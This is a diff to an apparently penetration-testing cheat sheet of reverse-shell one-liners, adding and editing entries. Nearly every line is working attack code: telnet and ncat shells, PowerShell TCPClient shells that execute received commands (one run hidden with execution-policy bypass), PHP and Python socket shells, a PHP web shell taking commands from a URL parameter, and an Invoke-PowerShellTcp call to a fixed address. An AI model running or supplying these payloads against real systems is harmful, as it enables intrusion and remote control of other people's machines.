@@ -38,8 +38,11 @@ rm -f /tmp/p; mknod /tmp/p p && telnet $source_ip $source_port 0/tmp/p
 ```bash
 //$source_ip/$smb_share/lists/static-binaries/binaries/windows/x86/ncat.exe $source_ip $source_port  --ssl -e cmd -v 
 ```
+```powershell
+New-Object System.Net.Sockets.TCPClient("$source_ip",$source_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
 ```bash
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$source_ip",$source_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object "System.Net.Sockets.TCPClient(\"$source_ip\",$source_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 ### ncat
@@ -69,6 +72,9 @@ ncat -nv $target $source_port --ssl
 ### Linux
 ```bash
 php -r '$sock=fsockopen("$source_ip",$source_port);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+```php
+<?php system($_GET["cmd"]); ?>
 ```
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$source_ip",$source_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -115,8 +121,5 @@ export SHELL=bash
 export TERM=xterm-256color
 stty rows 38 columns 116
 ```
-
-
-
 
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 9999
